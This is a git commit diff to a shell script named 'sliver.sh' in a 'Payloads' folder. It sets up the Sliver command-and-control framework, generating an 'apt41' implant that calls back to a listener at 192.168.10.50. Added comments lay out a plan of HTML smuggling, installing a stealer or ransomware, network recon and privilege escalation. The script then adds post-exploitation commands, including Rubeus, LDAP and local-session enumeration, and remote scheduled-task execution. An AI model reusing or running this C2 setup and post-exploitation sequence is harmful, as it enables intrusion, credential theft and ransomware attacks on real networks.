108923a720bc52c417c253f86aaddaf5e9123a31
Cazeho <58745332+Cazeho@users.noreply.github.com>
2025-02-14 17:27:29 +0100

    Update sliver.sh

--- Payloads/main/sliver.sh
+++ Payloads/main/sliver.sh
@@ -1,3 +1,11 @@
+## Html smuggling install a C2 program
+## use armory
+## install and execute a stealer or ramsomware in select mode
+## recon and scan network
+## privesc
+## exploit
+
+
 #!/bin/bash
 
 apt update
@@ -14,4 +22,17 @@ profiles new --http 192.168.10.50 -f exe apt41
 profiles generate apt41
 http
 https
+
+
 netstat -antb
+info
+getprivs
+armory install rubeus
+armory install sa-probe
+armory install sa-listdns
+armory install sa-netstat
+armory install sa-netlocalgroup2
+armory install sa-ldapsearch
+armory install sa-ipconfig
+armory install sa-enum-local-sessions
+armory install remote-schtasksrun
